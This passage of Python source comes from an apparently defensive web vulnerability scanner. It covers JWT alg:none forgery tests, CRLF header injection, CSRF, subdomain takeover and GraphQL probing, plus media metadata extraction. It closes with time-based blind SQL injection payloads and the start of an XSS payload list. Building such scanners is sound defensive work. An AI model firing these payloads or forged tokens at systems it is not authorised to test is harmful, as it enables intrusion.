        ("control: garbage signature", ".".join(token.split(".")[:2]) + ".AAAAgarbageAAAA"),
    ]
    baseline_len = None
    baseline_status = None
    forged_matches_baseline = False
    control_differs = False

    # Live-fire fix (staging lure verification): the shared scan session's
    # cookie jar still holds the GENUINE token, and requests sends jar +
    # per-request cookies together on the wire, so a server could satisfy
    # every replay - including the garbage-signature CONTROL - from the jar
    # copy, making control_differs impossible on real vulnerable sites.
    # Evict the jar copy before EVERY variant (sites that rotate their JWT
    # cookie would re-seed it between replays) and restore it afterwards.
    def _evict_token_cookie():
        for c in list(session.cookies):
            if c.name == cookie_name:
                session.cookies.clear(c.domain, c.path, c.name)

    saved_jar = [(c.name, c.value, c.domain, c.path) for c in session.cookies]
    if cookie_name:
        _evict_token_cookie()

    try:
        for label, tok in variants:
            if cookie_name:
                _evict_token_cookie()
            row = {"variant": label}
            try:
                kwargs = {"timeout": REQUEST_TIMEOUT}
                if cookie_name:
                    kwargs["cookies"] = {cookie_name: tok}
                else:
                    kwargs["headers"] = {"Authorization": f"Bearer {tok}"}
                r = session.get(base_url + "/", **kwargs)
                row.update({"status": r.status_code, "length": len(r.text)})
                if label.startswith("baseline"):
                    baseline_len, baseline_status = len(r.text), r.status_code
                elif label.startswith("alg:none"):
                    # Forgery "accepted" only if it behaves like the genuine token.
                    forged_matches_baseline = (
                        baseline_status is not None and
                        r.status_code == baseline_status and
                        abs(len(r.text) - (baseline_len or 0)) <= 64)
                else:  # garbage-signature control must behave DIFFERENTLY, else
                    # the endpoint ignores auth state entirely and nothing is
                    # provable either way - report nothing rather than a guess.
                    control_differs = not (
                        r.status_code == baseline_status and
                        abs(len(r.text) - (baseline_len or 0)) <= 64)
            except requests.RequestException:
                row["error"] = "unreachable"
            rows.append(row)
    finally:
        if cookie_name:
            for c_name, c_value, c_domain, c_path in saved_jar:
                if c_name == cookie_name:
                    session.cookies.set(c_name, c_value, domain=c_domain, path=c_path)

    accepted = forged_matches_baseline and control_differs

    if accepted:
        findings.append(Finding(
            "JWT Forgery", "Server accepted a JWT re-signed with alg:none",
            "critical",
            "The application honored a token whose header was changed to \"alg\": \"none\" "
            "with the signature stripped - its payload claims are entirely attacker-controlled.",
            "Pin allowed algorithms server-side (e.g. HS256/RS256 allowlist); reject "
            "'none' unconditionally; verify signatures before reading claims.",
            confidence="Confirmed"))
    return {"tested": True, "cookie": cookie_name or "Authorization header", "variants": rows}, findings


def check_crlf_injection(urls, session):
    """INTR-07: CRLF injection canary in query parameters. The payload is
    percent-encoded exactly once (via _inject_param_raw); detection is OUR
    OWN response header appearing in the reply - proof the backend decoded
    and emitted a second header. Stops at the first confirmation."""
    rows, findings = [], []
    probes = 0
    confirmed = False
    payload_raw = f"\r\n{CRLF_CANARY_HEADER}: 1"
    for url in urls[:MAX_CRLF_PROBE_PARAMS]:
        if confirmed:
            break
        for param in parse_qs(urlparse(url).query):
            if confirmed or probes >= MAX_CRLF_PROBE_PARAMS:
                break
            try:
                crlf_url = _inject_param_raw(url, param, payload_raw)
                r = session.get(crlf_url, timeout=REQUEST_TIMEOUT)
                probes += 1
                reflected = any(h.lower() == CRLF_CANARY_HEADER.lower() for h in r.headers)
                rows.append({"url": url, "param": param,
                             "result": "fail" if reflected else "pass"})
                if reflected:
                    confirmed = True
                    findings.append(Finding(
                        "CRLF Injection", f"Response header splitting via '{param}' on {url}",
                        "high",
                        f"Our {CRLF_CANARY_HEADER} header came back as a REAL response "
                        "header - user input terminates the header section unsanitized.",
                        "Strip CR/LF from all user input before header emission; use the "
                        "framework's header-setting APIs, never raw concatenation.",
                        confidence="Confirmed"))
            except requests.RequestException:
                rows.append({"url": url, "param": param, "result": "info"})
    return rows, findings


def _inject_param_raw(url, param, value_raw):
    """Like _inject_param but encodes values exactly ONCE (quote with no
    safe chars) instead of running them through parse_qs->urlencode, which
    would double-encode % sequences."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    parts = []
    for k, vals in qs.items():
        raw = value_raw if k == param else vals[0]
        parts.append(f"{k}={quote(raw, safe='')}")
    return urlunparse(parsed._replace(query="&".join(parts)))


def check_csrf_posture(forms):
    """INTR-08: pure-data heuristic over crawl_same_origin's enumerated form
    list (forms are display-only everywhere in Glassbox - this check performs
    ZERO network requests). Flags state-changing POST forms that carry no
    input resembling an anti-CSRF token."""
    rows, findings = [], []
    post_forms = [f for f in forms if (f.get("method") or "").upper() == "POST"]
    for form in post_forms:
        names = [str(n or "") for n in form.get("inputs", [])]
        has_token = any(any(h in n.lower() for h in CSRF_TOKEN_HINTS) for n in names)
        rows.append({"action": form.get("action"), "inputs": names,
                     "has_token_hint": has_token})
    missing = [r for r in rows if not r["has_token_hint"]]
    if missing:
        examples = ", ".join(str(m["action"]) for m in missing[:3])
        findings.append(Finding(
            "CSRF", f"{len(missing)} state-changing form(s) show no anti-CSRF token",
            "medium",
            f"POST form(s) such as {examples} contain no input field resembling a CSRF "
            "token (csrf/token/nonce/authenticity). Cross-site requests may be accepted "
            "on behalf of logged-in users.",
            "Require a per-session synchronizer token (or SameSite=Lax/Strict + Origin "
            "checking) on every state-changing endpoint.", confidence="Potential"))
    return rows, findings


def check_subdomain_takeover(hostname):
    """INTR-09: DNS-only dangling-CNAME detection for common subdomains of
    the target's registrable domain. A subdomain is flagged ONLY when its
    CNAME points at a takeover-fingerprinted service AND that target no
    longer resolves (NXDOMAIN) - the classic takeover prerequisite. No HTTP
    requests are made to any third-party host."""
    rows, findings = [], []
    checked = 0
    for prefix in TAKEOVER_SUBDOMAIN_PREFIXES[:MAX_TAKEOVER_SUBDOMAINS]:
        fqdn = f"{prefix}.{hostname}"
        row = {"subdomain": fqdn}
        try:
            answers = dns.resolver.resolve(fqdn, "CNAME")
            cname = str(answers[0].target).rstrip(".")
            row["cname"] = cname
            service = next((name for suffix, name in SUBDOMAIN_TAKEOVER_FINGERPRINTS.items()
                            if cname == suffix or cname.endswith("." + suffix)), None)
            if service:
                row["service"] = service
                try:
                    dns.resolver.resolve(cname, "A")
                    row["dangling"] = False
                except dns.resolver.NXDOMAIN:
                    row["dangling"] = True
                    findings.append(Finding(
                        "Subdomain Takeover", f"{fqdn} dangles at an unclaimed {service} target",
                        "high",
                        f"{fqdn} is a CNAME to {cname} ({service}), which no longer resolves. "
                        "Whoever registers that resource identifier serves arbitrary content "
                        "under YOUR subdomain.",
                        f"Remove the DNS record, or reclaim the {service} resource named "
                        f"{cname}.", confidence="Strong Evidence"))
        except Exception:
            # NXDOMAIN / no CNAME / resolver trouble are all just "nothing
            # here" - best-effort by design, never fatal (house DNS style).
            row["result"] = "no cname"
        checked += 1
    return {"checked": checked, "rows": rows}, findings


def check_graphql_deep(base_url, session):
    """INTR-10: read-only GraphQL probing. For each well-known endpoint
    path: one introspection query (is the schema mapable by anyone?), and -
    only where introspection is disabled - one bogus-field query to see if
    error messages leak valid field suggestions. No mutation operations are
    ever sent."""
    rows, findings = [], []
    for path in GRAPHQL_CANDIDATE_PATHS[:MAX_GRAPHQL_ENDPOINTS]:
        url = base_url + path
        row = {"endpoint": path}
        try:
            r = session.post(url, data=GRAPHQL_INTROSPECTION_BODY,
                             headers={"Content-Type": "application/json"},
                             timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code != 200:
            row["result"] = f"not graphql ({r.status_code})"
            rows.append(row)
            continue
        if "__schema" in r.text:
            row["result"] = "live - introspection enabled"
            findings.append(Finding(
                "GraphQL Exposure", f"GraphQL schema introspection is publicly enabled at {path}",
                "medium",
                "Anyone can walk your entire API schema (types, fields, relations) via a "
                "standard __schema query - an attacker's reconnaissance work is done for them.",
                "Disable introspection in production or gate it behind admin auth.",
                confidence="Confirmed"))
            try:
                r2 = session.post(url, data=GRAPHQL_SUGGESTION_BODY,
                                  headers={"Content-Type": "application/json"},
                                  timeout=REQUEST_TIMEOUT)
                if "Did you mean" in r2.text:
                    row["field_suggestions"] = True
                    findings.append(Finding(
                        "GraphQL Exposure", f"Validation errors suggest field names at {path}",
                        "low",
                        "Error messages include 'Did you mean ...' hints, letting attackers "
                        "enumerate the schema even with introspection off.",
                        "Suppress suggestion text in production GraphQL error responses.",
                        confidence="Confirmed"))
            except requests.RequestException:
                pass
        else:
            row["result"] = "live - introspection disabled"
            # Suggestions leak is MOST interesting with introspection off -
            # it's the attacker's only remaining schema oracle.
            try:
                r2 = session.post(url, data=GRAPHQL_SUGGESTION_BODY,
                                  headers={"Content-Type": "application/json"},
                                  timeout=REQUEST_TIMEOUT)
                if "Did you mean" in r2.text:
                    row["field_suggestions"] = True
                    findings.append(Finding(
                        "GraphQL Exposure", f"Validation errors suggest field names at {path}",
                        "low",
                        "Introspection is off, but error messages include 'Did you mean ...' "
                        "hints - attackers can still enumerate the schema field by field.",
                        "Suppress suggestion text in production GraphQL error responses.",
                        confidence="Confirmed"))
            except requests.RequestException:
                pass
        rows.append(row)
    return rows, findings


# --------------------------------------------------------------------------
# Media discovery. Runs as its own scan (see run_media_scan / POST
# /scan-media), separate from the base scan, since it can be slower
# (fetches multiple pages plus image bodies for EXIF checks) and has an
# optional download-to-disk mode the base scan doesn't need.
# --------------------------------------------------------------------------

# Common lazy-load attributes site builders/JS frameworks use instead of a
# real src (the browser only fills `src` in once the element scrolls into
# view), plus poster frames and responsive srcset - all missed by a naive
# img[src]/video[src] only crawl.
IMG_URL_ATTRS = ("src", "data-src", "data-lazy-src", "data-original", "data-original-src")
SOURCE_URL_ATTRS = ("src", "data-src")
VIDEO_URL_ATTRS = ("src", "poster", "data-src", "data-poster")
MEDIA_FILE_EXTENSIONS = (".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg", ".bmp", ".tiff",
                          ".mp4", ".webm", ".mov", ".avi", ".mkv", ".m4v", ".ogv")
# Kept separate from MEDIA_FILE_EXTENSIONS - documents get metadata
# extraction (docProps/core.xml or PDF /Info dict), not EXIF, and are
# reported under their own "document" item kind rather than "other".
DOCUMENT_FILE_EXTENSIONS = (".pdf", ".docx", ".xlsx", ".pptx")
VIDEO_EMBED_DOMAINS = ("youtube.com", "youtube-nocookie.com", "youtu.be", "vimeo.com",
                        "player.vimeo.com", "wistia.com", "wistia.net", "dailymotion.com", "loom.com")
MEDIA_PAGE_HINTS = ("gallery", "portfolio", "media", "video", "photo", "work", "project", "about")


def _first_srcset_url(srcset):
    if not srcset:
        return None
    first = srcset.split(",")[0].strip()
    return first.split(" ")[0] if first else None


def _bg_image_url(style):
    if not style:
        return None
    m = re.search(r'background-image\s*:\s*url\((["\']?)([^"\')]+)\1\)', style, re.I)
    return m.group(2) if m else None


def _extract_media_urls(base_url, html):
    """Returns (direct_media_urls, embedded_video_urls, document_urls).
    Direct URLs point to actual image/video files (HEAD-checkable,
    downloadable). Embedded URLs are third-party player iframes (YouTube/
    Vimeo/etc.) that can't be downloaded as a file but are still worth
    inventorying - a site's video content isn't only self-hosted <video>
    tags. Document URLs (PDF/DOCX/XLSX/PPTX) are linked files eligible for
    metadata extraction (see _extract_pdf_metadata/_extract_office_metadata)."""
    soup = BeautifulSoup(html, "html.parser")
    urls = set()
    doc_urls = set()

    for img in soup.find_all("img"):
        for attr in IMG_URL_ATTRS:
            if img.get(attr):
                urls.add(urljoin(base_url + "/", img[attr]))
        candidate = _first_srcset_url(img.get("srcset") or img.get("data-srcset"))
        if candidate:
            urls.add(urljoin(base_url + "/", candidate))

    for source in soup.find_all("source"):
        for attr in SOURCE_URL_ATTRS:
            if source.get(attr):
                urls.add(urljoin(base_url + "/", source[attr]))
        candidate = _first_srcset_url(source.get("srcset"))
        if candidate:
            urls.add(urljoin(base_url + "/", candidate))

    for video in soup.find_all("video"):
        for attr in VIDEO_URL_ATTRS:
            if video.get(attr):
                urls.add(urljoin(base_url + "/", video[attr]))

    for tag in soup.find_all(style=True):
        bg = _bg_image_url(tag.get("style"))
        if bg:
            urls.add(urljoin(base_url + "/", bg))

    for prop in ("og:image", "og:image:url", "og:video", "og:video:url", "og:video:secure_url"):
        for meta in soup.find_all("meta", attrs={"property": prop}):
            if meta.get("content"):
                urls.add(urljoin(base_url + "/", meta["content"]))

    for a in soup.find_all("a", href=True):
        href = a["href"].split("?")[0].split("#")[0]
        href_lower = href.lower()
        if href_lower.endswith(MEDIA_FILE_EXTENSIONS):
            urls.add(urljoin(base_url + "/", a["href"]))
        elif href_lower.endswith(DOCUMENT_FILE_EXTENSIONS):
            doc_urls.add(urljoin(base_url + "/", a["href"]))

    embeds = set()
    for iframe in soup.find_all("iframe", src=True):
        abs_url = urljoin(base_url + "/", iframe["src"])
        host = urlparse(abs_url).netloc.lower()
        if any(domain in host for domain in VIDEO_EMBED_DOMAINS):
            embeds.add(abs_url)

    return urls, embeds, doc_urls


MAX_429_BACKOFF_SECONDS = 5


def _get_respecting_backoff(session, url, **kwargs):
    """GET that backs off once if the server answers 429, honoring
    Retry-After when present (capped at MAX_429_BACKOFF_SECONDS so a
    misbehaving/malicious Retry-After value can't stall a scan). Retries
    at most once - this is politeness for a multi-page crawl, not a full
    retry policy - and never raises past its own request; callers already
    handle requests.RequestException the same way they would without this
    wrapper."""
    r = session.get(url, **kwargs)
    if r.status_code == 429:
        wait = r.headers.get("Retry-After")
        try:
            wait = min(float(wait), MAX_429_BACKOFF_SECONDS) if wait else 1.0
        except ValueError:
            wait = 1.0
        time.sleep(wait)
        r = session.get(url, **kwargs)
    return r


def crawl_media(session, base_url):
    """Depth-1 same-origin crawl (homepage + up to MAX_MEDIA_PAGES-1 linked
    pages, prioritizing links that look media-heavy - gallery/portfolio/
    video/photo/etc. - over generic nav links) collecting direct media
    files plus third-party video embeds.

    Respectful-crawling controls: skips pages disallowed by /robots.txt's
    `User-agent: *` rules (see _fetch_robots_disallow_prefixes), and backs
    off once on a 429 rather than hammering a throttling server."""
    origin = urlparse(base_url).netloc
    try:
        home_r = _get_respecting_backoff(session, base_url + "/", timeout=REQUEST_TIMEOUT)
    except requests.RequestException as e:
        return [], [], [], {"error": str(e)}

    disallow_prefixes = _fetch_robots_disallow_prefixes(session, base_url)
    soup = BeautifulSoup(home_r.text, "html.parser")
    candidates = []
    for a in soup.find_all("a", href=True):
        abs_url = urljoin(base_url + "/", a["href"])
        p = urlparse(abs_url)
        if (p.netloc == origin and abs_url not in candidates and abs_url.rstrip("/") != base_url.rstrip("/")
                and not _robots_disallows(p.path, disallow_prefixes)):
            candidates.append(abs_url)
    candidates.sort(key=lambda u: 0 if any(h in u.lower() for h in MEDIA_PAGE_HINTS) else 1)
    pages = [base_url + "/"] + candidates[:MAX_MEDIA_PAGES - 1]

    media_urls, embeds, doc_urls = _extract_media_urls(base_url, home_r.text)
    for page in pages[1:]:
        try:
            r = _get_respecting_backoff(session, page, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue
        # Named rather than u/e/d: `e` is also the exception variable in
        # this function's own `except requests.RequestException as e`
        # above, so the single letter meant two unrelated things.
        page_media, page_embeds, page_docs = _extract_media_urls(base_url, r.text)
        media_urls |= page_media
        embeds |= page_embeds
        doc_urls |= page_docs

    return (list(media_urls)[:MAX_MEDIA_ITEMS], list(embeds)[:20],
            list(doc_urls)[:MAX_MEDIA_DOCUMENTS], {"pages_crawled": len(pages)})


def _dms_to_decimal(dms, ref):
    try:
        degrees, minutes, seconds = (float(v) for v in dms)
    except (TypeError, ValueError):
        return None
    value = degrees + minutes / 60 + seconds / 3600
    if ref in ("S", "W"):
        value = -value
    return round(value, 6)


def _extract_exif(image_bytes):
    """Returns a small dict of human-readable EXIF fields, or {} if none/
    unreadable. Never raises - malformed image bytes just yield no data."""
    try:
        img = Image.open(io.BytesIO(image_bytes))
        exif_raw = img.getexif()
        if not exif_raw:
            return {}
        exif = {ExifTags.TAGS.get(k, k): v for k, v in exif_raw.items()}
        result = {}
        for key in ("Make", "Model", "Software", "Artist", "DateTimeOriginal"):
            if key in exif:
                result[key] = str(exif[key])[:100]

        gps_raw = exif_raw.get_ifd(ExifTags.IFD.GPSInfo) if hasattr(exif_raw, "get_ifd") else exif.get("GPSInfo")
        if gps_raw:
            gps = {ExifTags.GPSTAGS.get(k, k): v for k, v in gps_raw.items()}
            if "GPSLatitude" in gps and "GPSLongitude" in gps:
                lat = _dms_to_decimal(gps["GPSLatitude"], gps.get("GPSLatitudeRef", "N"))
                lon = _dms_to_decimal(gps["GPSLongitude"], gps.get("GPSLongitudeRef", "E"))
                if lat is not None and lon is not None:
                    result["GPS"] = f"{lat}, {lon}"
        return result
    except Exception:
        return {}


# --------------------------------------------------------------------------
# Document/video metadata extraction (media-scan sophistication, 2026-08-26
# review). Both deliberately avoid new third-party dependencies:
# - PDF: /Info dictionary fields are regex-extracted directly from the raw
#   bytes, the same lightweight-extraction style check_vulnerable_js/
#   check_dependency_audit already use on HTML. Only catches the common
#   case of an uncompressed /Info dict (most PDF authoring tools write one)
#   - a PDF using compressed cross-reference/object streams for its Info
#   dict won't match, which just means no metadata is reported, never a
#   false claim.
# - DOCX/XLSX/PPTX: all three are a zip archive with the same
#   docProps/core.xml part (the OOXML "core properties" schema) - read via
#   the stdlib zipfile + xml.etree.ElementTree, no new dependency needed.
# - MP4/MOV: GPS/make/model/software are stored as plain-text QuickTime
#   "user data" atoms (©xyz/©mak/©mod/©swr) - a well-documented format
#   (this is literally how phones geotag videos) that's byte-scannable
#   without a full container-parsing library.
# --------------------------------------------------------------------------

_PDF_INFO_FIELD_RE = re.compile(
    rb"/(Author|Creator|Producer|Title|Subject)\s*\(((?:[^()\\]|\\.)*)\)"
)


def _pdf_unescape(raw):
    """Minimal PDF literal-string unescaping - \\(, \\), \\\\, and octal
    \\ddd sequences (the only escapes /Info dict values commonly use);
    anything else passes through unchanged rather than raising."""
    out = bytearray()
    i = 0
    while i < len(raw):
        b = raw[i]
        if b == 0x5C and i + 1 < len(raw):  # backslash
            nxt = raw[i + 1]
            if nxt in (0x28, 0x29, 0x5C):  # ( ) \
                out.append(nxt)
                i += 2
                continue
            if 0x30 <= nxt <= 0x37:  # octal escape, up to 3 digits
                j = i + 1
                digits = b""
                while j < len(raw) and j < i + 4 and 0x30 <= raw[j] <= 0x37:
                    digits += bytes([raw[j]])
                    j += 1
                try:
                    out.append(int(digits, 8) & 0xFF)
                except ValueError:
                    out.append(nxt)
                i = j
                continue
        out.append(b)
        i += 1
    return bytes(out)


def _extract_pdf_metadata(data):
    """Returns a small dict of human-readable /Info dict fields found in
    raw PDF bytes, or {} if none/unreadable/compressed-Info-dict. Never
    raises - malformed or unexpected bytes just yield no data, same
    convention as _extract_exif."""
    try:
        if not data.startswith(b"%PDF-"):
            return {}
        result = {}
        for m in _PDF_INFO_FIELD_RE.finditer(data):
            field = m.group(1).decode("ascii")
            try:
                value = _pdf_unescape(m.group(2)).decode("utf-8", errors="replace")
            except Exception:
                continue
            value = value.strip()
            if value:
                result[field] = value[:100]
        return result
    except Exception:
        return {}


_OOXML_CORE_PROPS_NS = {
    "cp": "http://schemas.openxmlformats.org/package/2006/metadata/core-properties",
    "dc": "http://purl.org/dc/elements/1.1/",
    "dcterms": "http://purl.org/dc/terms/",
}
_OOXML_CORE_PROPS_MAX_BYTES = 200_000  # docProps/core.xml is always tiny in practice


def _extract_office_metadata(data):
    """Returns a small dict of docProps/core.xml fields (creator, last
    modified by, company via extended props isn't read - core.xml only)
    for a DOCX/XLSX/PPTX file, or {} if not a valid OOXML zip / no core
    properties part / unreadable. Never raises.

    Defensive by construction against a malicious zip masquerading as an
    Office doc: only ever reads the one named `docProps/core.xml` entry
    (never iterates/extracts the archive), and skips it outright if its
    declared size looks implausible for what is always a small XML file
    in real documents - the caller's MAX_MEDIA_FILE_BYTES download cap is
    the outer bound on the whole file regardless."""
    try:
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            info = zf.getinfo("docProps/core.xml")
            if info.file_size > _OOXML_CORE_PROPS_MAX_BYTES:
                return {}
            xml_bytes = zf.read(info)
    except (zipfile.BadZipFile, KeyError, OSError):
        return {}

    try:
        root = ElementTree.fromstring(xml_bytes)
    except ElementTree.ParseError:
        return {}

    result = {}
    field_tags = {
        "Author": ("dc", "creator"),
        "LastModifiedBy": ("cp", "lastModifiedBy"),
        "Title": ("dc", "title"),
        "Company": ("dc", "publisher"),
    }
    for label, (prefix, tag) in field_tags.items():
        el = root.find(f"{{{_OOXML_CORE_PROPS_NS[prefix]}}}{tag}")
        if el is not None and el.text and el.text.strip():
            result[label] = el.text.strip()[:100]
    return result


# QuickTime/MP4 user-data metadata atoms: 4-byte size, ©-prefixed 4-byte
# type, then (in the common ISO "full atom" text form) a 2-byte string
# length + 2-byte language code + the UTF-8 string itself.
_MP4_METADATA_ATOMS = {
    b"\xa9xyz": "GPS",       # ISO 6709 string, e.g. "+37.3349-122.0090+000.000/"
    b"\xa9mak": "Make",
    b"\xa9mod": "Model",
    b"\xa9swr": "Software",
    b"\xa9day": "DateTimeOriginal",
}
_MP4_ISO6709_RE = re.compile(r"^([+-]\d+\.\d+)([+-]\d+\.\d+)")


def _extract_mp4_metadata(data):
    """Returns a small dict of QuickTime/MP4 user-data metadata fields
    found by scanning for known atom tags directly in the byte stream, or
    {} if none/not an MP4-family file/unreadable. Never raises.

    Deliberately not a full MP4/QuickTime container parser (no moov/udta
    box traversal) - just a bounded scan for these specific well-known
    tag byte sequences, each followed by its documented [strlen(2)]
    [lang(2)][string] header. A tag byte sequence that happens to occur
    in unrelated binary data (extremely unlikely for 4 specific bytes
    including a non-ASCII lead byte, but not impossible) is guarded by a
    sane length check and a UTF-8 decode attempt - garbage that doesn't
    decode cleanly, or decodes to an implausible length, is skipped."""
    try:
        if data[4:8] not in (b"ftyp", b"moov", b"free", b"mdat", b"wide"):
            return {}
        result = {}
        for tag, label in _MP4_METADATA_ATOMS.items():
            idx = data.find(tag)
            if idx == -1 or idx + 8 > len(data):
                continue
            strlen = struct.unpack(">H", data[idx + 4:idx + 6])[0]
            if not (0 < strlen <= 200):
                continue
            start = idx + 8
            raw = data[start:start + strlen]
            if len(raw) != strlen:
                continue
            try:
                value = raw.decode("utf-8").strip()
            except UnicodeDecodeError:
                continue
            if not value:
                continue
            if label == "GPS":
                m = _MP4_ISO6709_RE.match(value)
                if not m:
                    continue
                result[label] = f"{m.group(1)}, {m.group(2)}"
            else:
                result[label] = value[:100]
        return result
    except Exception:
        return {}


def check_media(session, base_url, download, max_files):
    media_urls, embed_urls, document_urls, crawl_info = crawl_media(session, base_url)
    if not media_urls and not embed_urls and not document_urls:
        return {"media_items": [], "crawl_info": crawl_info, "downloaded_count": 0, "download_dir": None}, []

    findings = []
    items = []
    exif_checked = 0
    video_meta_checked = 0
    downloaded = 0
    download_dir = None
    if download:
        hostname = urlparse(base_url).netloc.replace(":", "_")
        download_dir = os.path.join(DOWNLOADS_DIR, f"{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        os.makedirs(download_dir, exist_ok=True)

    for i, url in enumerate(media_urls):
        item = {"url": url}
        path_lower = urlparse(url).path.lower()
        suspicious = any(hint in path_lower for hint in MEDIA_PATH_HINTS)
        item["suspicious_path"] = suspicious

        try:
            head = session.head(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            if head.status_code in (405, 501) or not head.headers.get("Content-Type"):
                raise requests.RequestException("HEAD unsupported/uninformative")
        except requests.RequestException:
            try:
                head = session.get(url, timeout=REQUEST_TIMEOUT, stream=True)
                head.close()
            except requests.RequestException as e:
                item["error"] = str(e)
                items.append(item)
                continue

        item["status"] = head.status_code
        ctype = head.headers.get("Content-Type", "")
        item["content_type"] = ctype
        clen = head.headers.get("Content-Length")
        item["size"] = int(clen) if clen and clen.isdigit() else None

        if head.status_code != 200:
            items.append(item)
            continue

        is_image = ctype.startswith("image/")
        is_video = ctype.startswith("video/")
        item["kind"] = "image" if is_image else ("video" if is_video else "other")

        if suspicious:
            findings.append(Finding("Media exposure", f"Possibly unintended public media file: {url}", "medium",
                                     "The file path contains a hint (e.g. 'private', 'backup', 'internal') "
                                     "suggesting this wasn't meant to be publicly reachable, but it returns HTTP 200.",
                                     "Move non-public assets behind authentication or remove them from the public web root.", confidence="Potential"))

        want_exif = is_image and "jpeg" in ctype.lower() and exif_checked < MAX_EXIF_IMAGES
        want_video_meta = (
            is_video and any(h in ctype.lower() for h in ("mp4", "quicktime"))
            and video_meta_checked < MAX_VIDEO_METADATA_FILES
        )
        want_download = download and item["kind"] in ("image", "video") and downloaded < max_files

        if want_exif or want_video_meta or want_download:
            try:
                r = session.get(url, timeout=REQUEST_TIMEOUT, stream=True)
                content = b""
                for chunk in r.iter_content(chunk_size=16384):
                    content += chunk
                    if len(content) >= MAX_MEDIA_FILE_BYTES:
                        item["truncated"] = True
                        break
                r.close()
            except requests.RequestException as e:
                item["download_error"] = str(e)
                items.append(item)
                continue

            if want_exif:
                exif_checked += 1
                exif = _extract_exif(content)
                if exif:
                    item["exif"] = exif
                    if "GPS" in exif:
                        findings.append(Finding("Media exposure", f"GPS location embedded in public image: {url}", "high",
                                                 f"EXIF metadata reveals GPS coordinates {exif['GPS']} - this can "
                                                 "disclose a physical location (home, office, event venue).",
                                                 "Strip EXIF metadata from images before publishing (most CMS/upload "
                                                 "pipelines can do this automatically).", confidence="Confirmed"))
                    elif any(k in exif for k in ("Make", "Model", "Artist", "Software")):
                        findings.append(Finding("Media exposure", f"Device/author metadata embedded in public image: {url}", "low",
                                                 f"EXIF metadata exposes: {', '.join(exif.keys())}.",
                                                 "Strip EXIF metadata from images before publishing if this isn't intentional.", confidence="Confirmed"))

            if want_video_meta:
                video_meta_checked += 1
                vmeta = _extract_mp4_metadata(content)
                if vmeta:
                    item["video_metadata"] = vmeta
                    if "GPS" in vmeta:
                        findings.append(Finding("Media exposure", f"GPS location embedded in public video: {url}", "high",
                                                 f"QuickTime/MP4 metadata reveals GPS coordinates {vmeta['GPS']} - this can "
                                                 "disclose a physical location (home, office, event venue), the same class "
                                                 "of leak as EXIF GPS in images.",
                                                 "Strip location metadata from videos before publishing (most editing/export "
                                                 "pipelines can do this automatically).", confidence="Confirmed"))
                    if any(k in vmeta for k in ("Make", "Model", "Software")):
                        exposed = [k for k in ("Make", "Model", "Software") if k in vmeta]
                        findings.append(Finding("Media exposure", f"Device/software metadata embedded in public video: {url}", "low",
                                                 f"QuickTime/MP4 metadata exposes: {', '.join(exposed)}.",
                                                 "Strip device/software metadata from videos before publishing if this isn't intentional.", confidence="Confirmed"))

            if want_download and download_dir:
                name = os.path.basename(urlparse(url).path) or f"file_{i}"
                name = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:120]
                dest = os.path.join(download_dir, f"{i:03d}_{name}")
                try:
                    with open(dest, "wb") as fh:
                        fh.write(content)
                    item["downloaded_to"] = os.path.relpath(dest, APP_DIR)
                    downloaded += 1
                except OSError as e:
                    item["download_error"] = str(e)

        items.append(item)

    for url in document_urls:
        item = {"url": url, "kind": "document"}
        path_lower = urlparse(url).path.lower()
        item["suspicious_path"] = any(hint in path_lower for hint in MEDIA_PATH_HINTS)

        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT, stream=True)
            content = b""
            for chunk in r.iter_content(chunk_size=16384):
                content += chunk
                if len(content) >= MAX_MEDIA_FILE_BYTES:
                    item["truncated"] = True
                    break
            r.close()
        except requests.RequestException as e:
            item["error"] = str(e)
            items.append(item)
            continue

        item["status"] = r.status_code
        item["content_type"] = r.headers.get("Content-Type", "")
        if r.status_code != 200:
            items.append(item)
            continue

        if item["suspicious_path"]:
            findings.append(Finding("Media exposure", f"Possibly unintended public document: {url}", "medium",
                                     "The file path contains a hint (e.g. 'private', 'backup', 'internal') "
                                     "suggesting this wasn't meant to be publicly reachable, but it returns HTTP 200.",
                                     "Move non-public assets behind authentication or remove them from the public web root.", confidence="Potential"))

        path_lower_ext = path_lower.split("?")[0]
        if path_lower_ext.endswith(".pdf"):
            doc_meta = _extract_pdf_metadata(content)
        elif path_lower_ext.endswith((".docx", ".xlsx", ".pptx")):
            doc_meta = _extract_office_metadata(content)
        else:
            doc_meta = {}

        if doc_meta:
            item["document_metadata"] = doc_meta
            findings.append(Finding("Media exposure", f"Author/software metadata embedded in public document: {url}", "low",
                                     f"Document properties expose: {', '.join(doc_meta.keys())}. "
                                     "This can reveal internal usernames, real names, or software/version details.",
                                     "Strip document properties before publishing (most office suites have a "
                                     "\"remove personal information\" export option).", confidence="Confirmed"))

        items.append(item)

    for url in embed_urls:
        host = urlparse(url).netloc.lower()
        platform = next((d for d in VIDEO_EMBED_DOMAINS if d in host), host)
        items.append({"url": url, "kind": "embedded", "status": None, "content_type": platform,
                       "size": None, "suspicious_path": False})

    return {"media_items": items, "crawl_info": crawl_info, "downloaded_count": downloaded,
            "download_dir": os.path.relpath(download_dir, APP_DIR) if download_dir else None,
            "embedded_count": len(embed_urls), "document_count": len(document_urls)}, findings


# --------------------------------------------------------------------------
# Advanced / authenticated checks. These run as their OWN scan (see
# run_advanced_scan / POST /scan-advanced), separate from the base scan,
# because they need extra fields the crawler can't infer on its own (form
# field names, a session cookie for a test account, etc.) Each technique
# below is multi-pronged rather than a single payload, so a naive filter
# blocking one variant doesn't hide a real vulnerability from the report.
# --------------------------------------------------------------------------

# Time-based blind payloads across the three DB engines most likely to be
# behind a typical stack. A 4s delay is long enough to be unambiguous over
# normal network jitter but short enough not to be a nuisance.
TIME_BLIND_DELAY = 4
TIME_BLIND_PAYLOADS = [
    f"' OR SLEEP({TIME_BLIND_DELAY})-- ",              # MySQL/MariaDB
    f"'; SELECT pg_sleep({TIME_BLIND_DELAY})-- ",       # PostgreSQL
    f"' WAITFOR DELAY '0:0:{TIME_BLIND_DELAY}'-- ",     # MSSQL
]

XSS_PAYLOAD_VARIANTS = [
